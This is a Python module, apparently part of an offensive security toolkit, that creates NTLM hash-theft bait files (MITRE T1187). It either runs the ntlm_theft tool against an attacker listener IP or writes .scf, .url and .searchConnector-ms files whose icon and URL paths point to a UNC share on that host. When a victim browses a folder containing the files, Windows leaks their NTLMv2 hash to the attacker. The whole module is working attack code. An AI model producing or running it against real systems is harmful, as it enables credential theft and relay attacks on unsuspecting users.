"""NTLM theft file generation — create files that leak NTLMv2 hashes."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.relay.ntlm_theft.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["file_creation", "credential_theft"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    listener = getattr(args, "relay_target", None) or getattr(args, "listener", None)
    output = getattr(args, "output", ".")

    print("[*] NTLM Theft File Generator")

    if not listener:
        print("[!] --relay-target or --listener required (attacker IP)")
        return 1

    import subprocess, shutil
    ntlm_theft = shutil.which("ntlm_theft") or shutil.which("ntlm_theft.py")
    if ntlm_theft:
        cmd = [ntlm_theft, "-g", "all", "-s", listener, "-f", "loot"]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=output)
        print(result.stdout)
        return result.returncode

    import os
    print("[*] ntlm_theft not found, generating common files manually")

    scf = "[Shell]\nCommand=2\nIconFile=\\\\{}\\share\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n".format(listener)
    url = "[InternetShortcut]\nURL=file://{}/@loot.html\n".format(listener)
    lnk_xml = '<?xml version="1.0" encoding="UTF-8"?>\n<searchConnectorDescription>\n<iconReference>\\\\{}\\share\\icon.ico</iconReference>\n</searchConnectorDescription>\n'.format(listener)

    for name, content in [("@loot.scf", scf), ("@loot.url", url), ("@loot.searchConnector-ms", lnk_xml)]:
        path = os.path.join(output, name)
        with open(path, "w") as fh:
            fh.write(content)
        print("[+] Created: {}".format(path))

    return 0
